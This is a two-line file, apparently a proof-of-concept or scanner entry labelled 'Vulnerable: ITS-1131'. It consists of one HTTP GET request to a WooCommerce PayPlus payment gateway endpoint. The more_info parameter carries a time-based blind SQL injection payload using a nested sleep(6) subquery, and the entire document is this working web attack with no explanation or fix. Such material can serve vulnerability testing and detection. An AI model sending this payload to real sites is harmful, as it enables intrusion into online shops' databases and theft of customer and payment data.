# Vulnerable: ITS-1131
GET /?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(6)))a)
